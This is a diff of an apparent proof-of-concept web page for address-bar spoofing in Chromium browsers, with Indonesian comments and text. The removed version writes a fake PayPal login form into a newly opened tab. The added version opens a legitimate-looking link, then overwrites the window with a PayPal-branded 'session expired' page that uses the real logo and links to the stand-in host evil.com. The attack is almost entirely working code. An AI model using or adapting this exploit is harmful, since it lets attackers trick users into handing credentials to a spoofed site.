@@ -1,74 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>PoC - Blank Address Bar Spoof (Improved)</title>
-  <style>
-    body { font-family: sans-serif; text-align: center; padding: 50px; }
-    button { padding: 12px 24px; font-size: 18px; background: #d32f2f; color: white; border: none; border-radius: 8px; cursor: pointer; }
-    .note { margin-top: 30px; font-size: 14px; color: #555; }
-  </style>
-</head>
-<body>
-  <h2>Blank Address Bar Spoofing (Race Condition)</h2>
-  <p>Klik tombol di bawah. Sebuah tab baru akan terbuka dengan <strong>address bar kosong</strong>, namun menampilkan halaman phishing palsu.</p>
-  <button id="exploitBtn">Klik untuk membuka (POC)</button>
-  <div class="note">
-    ⚠️ Kerentanan ini hanya bekerja pada browser berbasis Chromium versi lama (sebelum M92) yang belum mendapatkan patch.<br>
-    Demo: Tab baru akan menunjukkan URL kosong, padahal kontennya adalah halaman tiruan PayPal.
-  </div>
-
-  <script>
-    document.getElementById('exploitBtn').onclick = function() {
-      // Buka URL nyata (apa saja, misal google.com). Ini agar browser memulai navigasi.
-      const newTab = window.open('https://www.google.com', '_blank');
-      // Setelah 1 milidetik, timpa konten tab tersebut dengan halaman phishing.
-      setTimeout(function() {
-        if (newTab && !newTab.closed) {
-          newTab.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <title>PayPal - Log In</title>
-              <meta name="viewport" content="width=device-width, initial-scale=1">
-              <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                body {
-                  font-family: Arial, sans-serif;
-                  background: #f0f2f4;
-                  display: flex;
-                  justify-content: center;
-                  align-items: center;
-                  height: 100vh;
-                }
-                .container {
-                  background: white;
-                  width: 350px;
-                  padding: 30px;
-                  border-radius: 12px;
-                  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-                  text-align: center;
-                }
-                h1 { font-size: 24px; margin-bottom: 20px; color: #1c1e21; }
-                input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; }
-                button { width: 100%; background: #0070ba; color: white; padding: 12px; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; }
-                .warning { margin-top: 20px; font-size: 12px; color: red; }
-              </style>
-            </head>
-            <body>
-              <div class="container">
-                <h1>PayPal</h1>
-                <p style="color: #666;">Log in to your account</p>
-                <input type="email" placeholder="Email or mobile number">
-                <input type="password" placeholder="Password">
-                <button onclick="alert('Phishing demo: kredensial akan dicuri')">Log In</button>
-                <div class="warning">⚠️ This is a security research demo. Your address bar is blank.</div>
-              </div>
-            </body>
-            </html>
-          `);
-        }
-      }, 1); // 1ms – sangat cepat, navigasi asli belum sempat terjadi
-    };
-  </script>
-</body>
-</html>
+<script>
+function pwned() {
+var t = window.open('', 'ss');
+t.document.write(`<div style="text-align:center; padding:50px; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; color: #2c2e2f;"><img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" style="width:120px; margin-bottom:20px;"><h2 style="color:#003087; font-weight: normal;">Sesi Berakhir</h2><p style="font-size:15px; line-height:1.5;">Demi keamanan Anda, kami telah mengeluarkan Anda dari akun secara otomatis.<br>Silakan masuk kembali untuk melanjutkan.</p><br><a href="https://evil.com" style="background-color:#0070ba; color:white; padding:12px 30px; text-decoration:none; border-radius:25px; font-weight:bold; display:inline-block; font-size:14px;">Masuk ke Akun Saya</a></div>`);
+t.stop();
+}
+</script>
+<a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
